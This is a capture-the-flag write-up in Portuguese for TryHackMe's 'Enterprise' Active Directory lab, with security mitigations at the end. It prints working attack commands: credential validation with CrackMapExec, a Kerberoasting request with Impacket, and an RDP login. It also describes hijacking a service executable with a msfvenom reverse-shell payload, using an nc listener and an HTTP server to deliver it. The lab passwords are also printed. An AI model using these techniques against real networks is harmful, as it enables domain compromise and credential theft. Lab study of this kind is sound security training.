# 📄 RELATÓRIO TÉCNICO – CTF ENTERPRISE (TryHackMe)

👤 **Autor:** c0rt3s
🎯 **Plataforma:** TryHackMe
🖥️ **Máquina:** Enterprise
📌 **Tipo:** CTF – Active Directory / Windows / Privilege Escalation
⚙️ **Objetivo:** Comprometer o domínio e obter as flags do sistema
📊 **Nível de dificuldade:** Difícil
🧠 **Base de estudo:** Conteúdo e metodologia do curso da Desec Security

---

# 🎯 Objetivo do Lab

O objetivo deste laboratório foi comprometer a máquina **Enterprise** da plataforma TryHackMe explorando falhas de segurança em um ambiente **Active Directory baseado em Windows Server 2019**.

Durante o processo foram utilizadas técnicas de:

* Reconhecimento de serviços
* Enumeração de domínio
* Extração de credenciais
* Ataques Kerberos (Kerberoasting)
* Movimentação lateral
* Enumeração de privilégios
* Escalonamento de privilégios via serviço vulnerável

A exploração culminou na obtenção de acesso **administrativo ao domínio**, permitindo a captura das flags presentes no sistema.

---

# ⚔️ Resumo da Cadeia de Ataque

A exploração seguiu o seguinte fluxo:

```
Nmap Scan
      ↓
Enumeração SMB
      ↓
Investigação de repositório GitHub
      ↓
Credencial exposta (nik)
      ↓
Enumeração RPC
      ↓
Descoberta de usuário temporário
      ↓
Kerberoasting
      ↓
Crack de hash Kerberos
      ↓
Credencial bitbucket
      ↓
Acesso RDP
      ↓
Enumeração local
      ↓
Identificação do serviço ZeroTier
      ↓
Service Hijacking
      ↓
Reverse Shell como SYSTEM
      ↓
Acesso Administrator
      ↓
Captura das flags
```

Esse fluxo representa uma **cadeia clássica de ataque em ambientes Active Directory com múltiplas credenciais expostas e escalonamento via serviços mal configurados**.

---

# 🔍 Reconhecimento Inicial – Nmap

O primeiro passo foi identificar os serviços disponíveis na máquina alvo.

```
nmap -sC -sV -Pn enterprise.thm
```

Portas identificadas:

```
53
80
88
135
139
389
445
464
593
636
3268
3269
3389
5985
7990
9389
47001
49664-49709
```

Essas portas indicam claramente um **ambiente Active Directory**, incluindo serviços como:

* LDAP
* Kerberos
* SMB
* WinRM
* RDP

---

# 🏢 Identificação do Domínio

Durante a enumeração foi identificado o domínio:

```
LAB.ENTERPRISE.THM
```

Hostname do controlador de domínio:

```
LAB-DC.LAB.ENTERPRISE.THM
```

Sistema operacional identificado:

```
Windows Server 2019
```

---

# 📂 Enumeração SMB

A enumeração SMB revelou diversos compartilhamentos disponíveis.

```
smbclient -L //enterprise.thm
```

Compartilhamentos encontrados:

```
Docs
Users
SYSVOL
NETLOGON
```

---

# 📄 Arquivos Encontrados

Durante a exploração dos compartilhamentos foram encontrados alguns arquivos relevantes.

### Diretório Docs

Arquivos identificados:

```
RSA-Secured-Credentials.xlsx
RSA-Secured-Document-PII.docx
```

Ambos estavam protegidos por criptografia.

---

### Diretório Users

Foram encontrados diretórios de diversos usuários:

```
LAB-ADMIN
atlbitbucket
bitbucket
Administrator
```

Dentro do diretório **LAB-ADMIN** foi identificado um arquivo interessante:

```
AppData/Local/Microsoft/Credentials/DFBE70A7E5CC19A398EBF1B96859CE5D
```

Esse arquivo indica armazenamento de **credenciais do Windows Credential Manager**.

---

# 🌐 Investigação do Serviço Web – Porta 7990

Na porta **7990** foi encontrado um serviço web relacionado à Atlassian.

A página apresentava uma mensagem:

```
"We are moving to Github!"
```

Isso indicava que o código do projeto havia sido migrado para um repositório GitHub.

---

# 🔎 Investigação no GitHub

Durante a investigação foi encontrada a organização:

```
Enterprise-THM
```

Um colaborador relevante foi identificado:

```
Nik-enterprise-dev
```

Em um dos repositórios foi encontrado um **script PowerShell relacionado à automação de Active Directory**.

Ao analisar o histórico de commits foi possível identificar uma credencial exposta.

---

# 🔑 Credencial Exposta em Commit

Um commit antigo revelou as seguintes credenciais hardcoded:

```
Usuário: nik
Senha: ToastyBoi!
```

---

# ✔️ Validação da Credencial

A credencial foi validada utilizando **CrackMapExec**.

```
crackmapexec smb enterprise.thm -u nik -p 'ToastyBoi!'
```

Resultado:

```
[+] LAB.ENTERPRISE.THM\nik:ToastyBoi!
```

Isso confirmou que a credencial era válida no domínio.

---

# 📡 Enumeração RPC

Utilizando a credencial encontrada foi realizada enumeração via **RPC**.

```
rpcclient -U nik enterprise.thm
```

Durante a enumeração foi identificado um usuário adicional:

```
contractor-temp
```

Credencial associada:

```
Change password from Password123!
```

---

# 🔥 Kerberoasting

Com o usuário **contractor-temp**, foi possível realizar um ataque **Kerberoasting** utilizando ferramentas do **Impacket**.

```
impacket-GetUserSPNs LAB.ENTERPRISE.THM/contractor-temp:'Change password from Password123!' -dc-ip enterprise.thm -request
```

Esse comando permitiu obter um **hash Kerberos do tipo TGS**.

---

# 🔓 Crack da Hash Kerberos

A hash obtida foi quebrada utilizando **Hashcat**, revelando uma nova credencial:

```
Usuário: bitbucket
Senha: littleredbucket
```

---

# 🖥️ Acesso via RDP

Com essa credencial foi possível acessar a máquina através de **Remote Desktop Protocol**.

```
xfreerdp3 /u:bitbucket /p:littleredbucket /v:enterprise.thm
```

Após o login foi possível explorar o sistema.

---

# 🚩 Captura da Primeira Flag

Logo após o acesso inicial foi encontrada a primeira flag:

```
user.txt
```

---

# 🔎 Enumeração Local

Inicialmente foi tentado realizar enumeração de privilégios utilizando **BloodHound**, porém o processo não trouxe resultados úteis para exploração.

Durante a análise manual do sistema foi identificado um serviço instalado:

```
ZeroTier
```

Localizado em:

```
C:\Program Files (x86)\Zero Tier\Zero Tier One
```

Esse serviço posteriormente se mostrou vulnerável a **hijacking de executável**.

---

# 🧨 Preparação do Payload

Foi criado um payload utilizando **msfvenom**.

Nome do payload:

```
ZeroTierOneService.exe
```

Esse payload era responsável por abrir uma **reverse shell** para a máquina atacante.

---

# 🌐 Servidor HTTP na Máquina Atacante

Na máquina atacante foi iniciado um servidor HTTP simples.

```
python3 -m http.server
```

---

# 📥 Download do Payload na Máquina Alvo

Na máquina Windows comprometida foi realizado o download do payload.

O arquivo foi salvo no diretório do serviço **ZeroTier**.

```
C:\Program Files (x86)\Zero Tier\Zero Tier One
```

Posteriormente o executável original do serviço foi substituído pelo payload.

---

# 🎧 Listener na Máquina Atacante

Antes de reiniciar o serviço foi iniciado um listener para receber a conexão reversa.

```
nc -nlvp 4444
```

---

# 🚀 Escalonamento de Privilégio

Após substituir o executável do serviço **ZeroTier**, o serviço foi reiniciado.

Como o serviço era executado com privilégios elevados, o payload foi executado com **privilégios SYSTEM**.

Isso resultou na abertura de uma **reverse shell com privilégios administrativos**.

---

# 🔓 Acesso ao Administrator

Com acesso privilegiado foi possível acessar o diretório do administrador.

```
C:\Users\Administrator\Desktop
```

Nesse diretório foi encontrada a flag final:

```
root.txt
```

---

# 💥 Impacto de Segurança

Se esse cenário estivesse presente em um ambiente corporativo real, um atacante poderia:

* comprometer múltiplas contas do domínio
* realizar movimentação lateral na rede
* obter execução remota em servidores críticos
* escalar privilégios até administrador do sistema
* comprometer totalmente o domínio Active Directory

---

# 🛡️ Mitigações Recomendadas

Algumas medidas que poderiam prevenir esse tipo de ataque incluem:

* evitar exposição de credenciais em repositórios Git
* implementar rotação periódica de senhas
* restringir acesso a compartilhamentos SMB
* monitorar ataques Kerberoasting
* revisar permissões de serviços executados como SYSTEM
* implementar monitoramento de eventos do Active Directory

---

# 🧠 Conclusão

Este laboratório demonstrou diversas falhas comuns em ambientes Active Directory:

* credenciais expostas em repositórios
* contas temporárias mal gerenciadas
* vulnerabilidade a Kerberoasting
* serviços mal configurados permitindo escalonamento de privilégios

A exploração bem-sucedida reforça a importância de uma metodologia estruturada de pentest e demonstra na prática a aplicação das técnicas estudadas durante o treinamento da **Desec Security**.

---
